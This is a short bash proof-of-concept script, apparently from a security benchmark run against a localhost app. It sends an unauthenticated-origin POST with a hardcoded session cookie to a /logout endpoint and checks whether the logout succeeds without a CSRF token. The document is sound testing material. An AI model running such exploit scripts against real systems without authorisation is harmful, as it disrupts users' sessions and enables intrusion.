#!/bin/bash
# POC: Demonstrates CSRF vulnerability on /logout endpoint by successfully logging out a user without CSRF token validation using provided session cookie
# Target: ./repo
# Created: 2025-11-07T16:37:08.683Z
# Session: benchmark-XBEN-001-24-mhp2ljz1

# CSRF Attack on Logout Endpoint POC - Version 2
# This script demonstrates that the /logout endpoint accepts POST requests
# without CSRF token validation using a direct session cookie

TARGET_URL="http://localhost:8082"
LOGOUT_ENDPOINT="/logout"

# Use a valid session cookie from the evidence provided
SESSION_COOKIE="eyJ1c2VyX2lkIjoxMDAzMn0.aQ4fsg.a8G3iAIshF2rEXNioderrReEPLE"

echo "[*] CSRF Vulnerability POC - Logout Endpoint"
echo "[*] Target: $TARGET_URL$LOGOUT_ENDPOINT"
echo "[*] Using session cookie: ${SESSION_COOKIE:0:25}..."
echo ""

# Send a POST request to logout without CSRF token
echo "[+] Sending logout request WITHOUT CSRF token validation..."
LOGOUT_RESPONSE=$(curl -s -i -X POST "$TARGET_URL$LOGOUT_ENDPOINT" \
  -H "Cookie: session=$SESSION_COOKIE")

echo "[+] Response received:"
echo "$LOGOUT_RESPONSE"
echo ""

# Check for vulnerability indicators
if echo "$LOGOUT_RESPONSE" | grep -q "302\|301\|200"; then
  if echo "$LOGOUT_RESPONSE" | grep -q "Set-Cookie.*session=.*Max-Age=0\|Set-Cookie.*session=.*Expires=Thu"; then
    echo "[+] VULNERABILITY CONFIRMED!"
    echo "[+] Logout was processed without CSRF token"
    echo "[+] Session cookie was cleared (Set-Cookie with Max-Age=0)"
    echo ""
    echo "[!] IMPACT: Attacker can force logout via CSRF attack"
    exit 0
  elif echo "$LOGOUT_RESPONSE" | grep -q "Location:"; then
    echo "[+] VULNERABILITY CONFIRMED!"
    echo "[+] Logout was processed without CSRF token"
    echo "[+] Response shows redirect (302/301) indicating logout succeeded"
    echo ""
    echo "[!] IMPACT: Attacker can force logout via CSRF attack"
    exit 0
  fi
fi

echo "[-] Could not confirm vulnerability"
exit 1